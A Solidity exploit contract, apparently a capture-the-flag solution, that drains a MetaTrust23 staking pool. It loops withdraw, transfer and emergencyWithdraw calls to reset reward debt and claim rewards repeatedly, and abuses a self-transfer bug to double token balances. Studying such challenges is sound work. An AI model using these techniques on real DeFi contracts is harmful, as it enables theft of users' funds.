// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./StakingPools_MT.sol";
import "./StakingPoolsDeployment.sol";
import "./ERC20V2.sol";

contract Helper {
    StakingPoolsMetaTrust23 pool;
    constructor(StakingPoolsMetaTrust23 _pool) {
        pool = _pool;
    }
    function withdraw() public {
        pool.transfer(msg.sender, 1);
    }
}

contract StakingPoolAttackMetaTrust23 {
    StakingPoolsDeploymentMetaTrust23 public deployment;
    StakingPoolsMetaTrust23 public stakingPools;
    ERC20 public stakedToken;
    ERC20 public rewardToken;
    ERC20V2 public rewardToken2;
    ERC20[] public rewardTokens;

    function setUp(address target) public {
        deployment = StakingPoolsDeploymentMetaTrust23(target);
        stakingPools = deployment.stakingPools();
        stakedToken = deployment.stakedToken();
        rewardToken = deployment.rewardToken();
        rewardToken2 = deployment.rewardToken2();
    }

    function attack() public {
        stakedToken.approve(address(stakingPools), type(uint256).max);
        deployment.faucet();
        stakingPools.deposit(1); // set accTokenPerShare
    }

    function withdraw() public { 
        // useless
        // for(uint i =0; i<5; i++) {
        //     stakingPools.withdraw(1);
        //     stakingPools.emergencyWithdraw();
        //     stakingPools.deposit(1);
        // }
        
        // The purpose of the 'transfer' operation is to save the user's amount. Without this step, if the user clears his debt and wants to withdraw, he would need to deposit again, which would set their debt.
        Helper h = new Helper(stakingPools);
        for(uint i=0; i<100; i++) {
            stakingPools.withdraw(0);  // get reward but did not withdraw stakedToken
            stakingPools.transfer(address(h), 1); // save amount
            stakingPools.emergencyWithdraw();  // reset debt to 0
            h.withdraw();   // restore amount
        }
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function double() public {
        for(uint i=0; i<5; i++) {
            rewardToken2.transfer(address(this), rewardToken2.balanceOf(address(this)));
        }
        rewardToken2.transfer(msg.sender, rewardToken2.balanceOf(address(this)));
    }
}
